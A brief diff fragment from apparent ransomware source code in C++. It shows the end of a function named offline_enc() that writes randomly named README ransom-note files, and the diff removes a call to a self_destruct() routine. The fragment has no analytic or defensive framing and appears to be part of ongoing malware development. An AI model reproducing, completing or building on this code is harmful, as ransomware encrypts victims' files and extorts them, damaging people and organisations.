@@ -144,9 +144,5 @@ int offline_enc() {
     std::string readmeFileName = "README_" + randomReadme + ".txt";
     create_readmes(OFF_README, readmeFileName);
 
-
-    // call self-destruction
-    self_destruct();
-
     return 0;
 }
